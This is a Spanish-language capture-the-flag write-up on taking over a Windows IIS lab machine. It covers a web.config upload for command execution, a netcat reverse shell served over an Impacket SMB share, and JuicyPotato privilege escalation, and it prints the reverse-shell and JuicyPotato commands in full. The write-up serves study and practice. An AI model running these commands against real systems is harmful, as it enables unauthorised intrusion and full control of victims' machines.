Escaneo de puertos:

![](../../../Images/Pasted%20image%2020240924131916.png)

Como es máquina Windows es normal que tenga varios puertos abiertos

Reviso lo que corre en el puerto 80

![](../../../Images/Pasted%20image%2020240924132011.png)

Tengo una imagen sencilla de IIS7

Haré fuzzing web con Gobuster en busca de directorios:

![](../../../Images/Pasted%20image%2020240924132533.png)

Tengo el directorio /zoc.aspx, accederé a él:

![](../../../Images/Pasted%20image%2020240924132636.png)

Es una subida de archivos

Como tengo una subida de archivos subiré un .config para tener un CMD y poder ejecutar comandos, me ayudaré de este archivo: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Configuration%20IIS%20web.config/web.config

![](../../../Images/Pasted%20image%2020240924135606.png)

![](../../../Images/Pasted%20image%2020240924135624.png)

![](../../../Images/Pasted%20image%2020240924135631.png)

Y listo ya está subido mi archivo .config, ahora lo localizaré para ver donde se subió

Revisando el código fuente de esta página me encuentro con:

![](../../../Images/Pasted%20image%2020240924135739.png)

Accedo a este posible directorio:

![](../../../Images/Pasted%20image%2020240924135808.png)

Pero me aparece que no tengo permisos para ver este directorio, pero igualmente así no tenga permisos sobre este directorio si tengo permisos sobre mi archivo que subí, así que apuntaré hacia mi web.config:

![](../../../Images/Pasted%20image%2020240924135911.png)

Y ahora sí tengo un consola para escribir comandos cmd

Ahora para poder hacer la intrusión a la máquina primero copiaré el nc.exe (que es un binario para poder ejecutar la Shell Inversa) a mi actual directorio:

![](../../../Images/Pasted%20image%2020240924140317.png)

Ahora me levanto un recurso compartido con Impacket para poder enviar este .exe a la máquina:
```
impacket-smbserver $(pwd) recurso -smb2support 
```

![](../../../Images/Pasted%20image%2020240924140901.png)

Ahora accedo a este recurso desde la consola de comandos mientras que al mismo tiempo estoy escuchando con Netcat por el puerto 443:
```
//192.168.1.232/recurso/nc.exe -e cmd 192.168.1.232 443
```

![](../../../Images/Pasted%20image%2020240924141015.png)

![](../../../Images/Pasted%20image%2020240924141032.png)

![](../../../Images/Pasted%20image%2020240924141039.png)

Y listo, ahora estoy dentro de la máquina

Flag de user:

![](../../../Images/Pasted%20image%2020240924141225.png)

## ESCALADA DE PRIVILEGIOS

Observo los privilegios que tengo:

![](../../../Images/Pasted%20image%2020240924141309.png)

Y me llama la atención el "SeImpersonatePrivilege"

Por ende usaré una herramienta llamada JuicyPotato https://github.com/ohpe/juicy-potato

Me descargo el .exe en mi kali:

![](../../../Images/Pasted%20image%2020240924142549.png)

Y lo subiré a la máquina usando el recurso compartido:
```
copy \\192.168.1.232\recurso\JuicyPotato.exe  JuicyPotato.exe
```

![](../../../Images/Pasted%20image%2020240924144829.png)

Ahora subiré una ReverseShell creada con Msfvenom:

![](../../../Images/Pasted%20image%2020240924145053.png)

Y la subo a la máquina usando nuevamente el recurso compartido:

![](../../../Images/Pasted%20image%2020240924145133.png)

Listo ahora teniendo ambos archivos en la máquina veré que versión de windows me estoy enfrentando:

![](../../../Images/Pasted%20image%2020240924150425.png)

Estoy ante un 2008 R2

Busco el CLSID de esta versión, en: https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md  y es:

![](../../../Images/Pasted%20image%2020240924150529.png)

Ahora bien, ejecutaré el JuicyPotato pasándole el shell.exe y el CLSID, y estaré desde mi kali a la escucha con Netcat por el puerto 443:
```
JuicyPotato.exe -l 443 -p shell.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}
```

![](../../../Images/Pasted%20image%2020240924150747.png)

![](../../../Images/Pasted%20image%2020240924150808.png)

Y listo, ahora si soy usuario Administrador

Flag de administrador:

![](../../../Images/Pasted%20image%2020240924150918.png)

